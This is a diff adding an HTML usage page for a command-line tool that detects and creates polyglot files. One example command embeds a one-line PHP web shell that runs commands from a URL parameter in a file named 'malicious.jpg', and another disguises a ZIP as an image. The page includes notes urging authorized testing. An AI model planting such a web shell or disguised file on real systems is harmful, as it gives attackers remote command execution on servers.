@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Polyglot</title>
+    <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Usage Examples</h2>
+<ol>
+<li><strong>Install the tool:</strong></li>
+</ol>
+<p><code>bash
+chmod +x install_polyglot.sh
+./install_polyglot.sh</code></p>
+<ol>
+<li><strong>Detect file types:</strong></li>
+</ol>
+<p><code>bash
+polyglot detect suspicious_file.bin
+polyglot detect --json file1.jpg file2.zip</code></p>
+<ol>
+<li><strong>Create polyglot files:</strong></li>
+</ol>
+<p>```bash</p>
+<h1>Simple polyglot</h1>
+<p>polyglot create -o polyglot_file -c jpg zip pdf</p>
+<h1>With custom content</h1>
+<p>polyglot create -o malicious.jpg -c jpg php --content "<?php system($_GET['cmd']); ?>"</p>
+<h1>ZIP polyglot</h1>
+<p>polyglot create-zip -o hidden.jpg -f document.txt -d jpg
+```</p>
+<ol>
+<li><strong>Batch analysis:</strong></li>
+</ol>
+<p>```bash</p>
+<h1>Analyze all files in directory</h1>
+<p>polyglot detect downloads/*</p>
+<h1>Output to JSON for processing</h1>
+<p>polyglot detect --json suspicious_files/* &gt; analysis.json
+```</p>
+<h2>Features</h2>
+<ul>
+<li><strong>Multi-format Detection</strong>: Uses magic numbers, file command, and MIME types</li>
+<li><strong>Polyglot Scoring</strong>: Calculates how many file types a file could be</li>
+<li><strong>Suspicious Pattern Detection</strong>: Finds embedded scripts and multiple headers</li>
+<li><strong>Flexible Creation</strong>: Supports various polyglot combinations</li>
+<li><strong>ZIP Polyglots</strong>: Create ZIP files disguised as other formats</li>
+<li><strong>JSON Output</strong>: Machine-readable output for automation</li>
+<li><strong>Metadata Embedding</strong>: Add custom metadata to polyglot files</li>
+<li><strong>Cross-platform</strong>: Works on Linux, macOS, and Windows (with WSL)</li>
+</ul>
+<h2>Security Notes</h2>
+<ul>
+<li>This tool should only be used for legitimate security testing and research</li>
+<li>Always obtain proper authorization before testing files</li>
+<li>Polyglot files can be used maliciously - use responsibly</li>
+<li>The tool includes warnings for suspicious patterns to help identify potential threats</li>
+</ul>
+<p>The tool provides comprehensive polyglot file analysis and creation capabilities with a user-friendly CLI interface.</p>
+    </div>
+</body>
+</html>
